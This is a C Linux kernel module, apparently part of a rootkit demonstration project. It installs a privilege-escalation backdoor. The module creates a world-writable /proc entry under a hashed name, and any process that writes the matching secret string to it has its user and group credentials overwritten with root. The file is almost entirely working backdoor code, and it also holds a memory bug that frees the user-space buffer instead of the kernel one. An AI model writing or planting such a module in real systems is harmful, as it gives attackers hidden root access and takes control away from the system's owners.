/*
Copyright 2016 Gu Zhengxiong <rectigu@gmail.com>

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/


# ifndef CPP
# include <linux/module.h>
# include <linux/kernel.h>
# include <linux/fs.h> // struct file_operations.
# include <linux/proc_fs.h> // proc_create, proc_remove.
# include <linux/slab.h> // kmalloc, kfree.
# include <asm/uaccess.h> // copy_from_user.
# include <linux/cred.h> // struct cred.
# endif // CPP

# include "lib/lib.h"


MODULE_LICENSE("GPL");

// INFO: $ printf rootme | sha512sum
# define NAME "4b96c64ca2ddac7d50fd33bc75028c9462dfbea446f51e192b39011d984bc8809218e3907d48ffc2ddd2cce2a90a877a0e446f028926a828a5d47d72510eebc0"
// INFO: $ printf r00tme | sha512sum
# define AUTH "05340126a6ae3257933cd7254aeaac2226ab164dc864fffc9953f01134b29f6b1c418d45570d112fba7b5bf831f52bd14071949e2add979e903113618b0e5584"

struct proc_dir_entry *entry;

ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp);

struct file_operations proc_fops = {
    .write = write_handler
};


int
init_module(void)
{
    fm_alert("%s\n", "Greetings the World!");

    entry = proc_create(NAME, S_IRUGO | S_IWUGO, NULL, &proc_fops);

    return 0;
}


void
cleanup_module(void)
{
    proc_remove(entry);

    fm_alert("%s\n", "Farewell the World!");
    return;
}


ssize_t
write_handler(struct file * filp, const char __user *buff,
              size_t count, loff_t *offp)
{
    char *kbuff;
    struct cred* cred;

    // WARN: Be careful. There is a chance for off-by-one NULL.
    kbuff = kmalloc(count + 1, GFP_KERNEL);
    if (!kbuff) {
        return -ENOMEM;
    }
    if (copy_from_user(kbuff, buff, count)) {
        kfree(kbuff);
        return -EFAULT;
    }
    kbuff[count] = (char)0;

    if (strlen(kbuff) == strlen(AUTH) &&
        strncmp(AUTH, kbuff, count) == 0) {
        fm_alert("%s\n", "Comrade, I will help you.");
        cred = (struct cred *)__task_cred(current);
        // TODO: We might probably just copy the cred from pid 1.
        cred->uid = cred->euid = cred->fsuid = GLOBAL_ROOT_UID;
        cred->gid = cred->egid = cred->fsgid = GLOBAL_ROOT_GID;
        fm_alert("%s\n", "See you!");
    } else {
        fm_alert("Alien, get out of here: %s.\n", kbuff);
    }

    kfree(buff);
    return count;
}
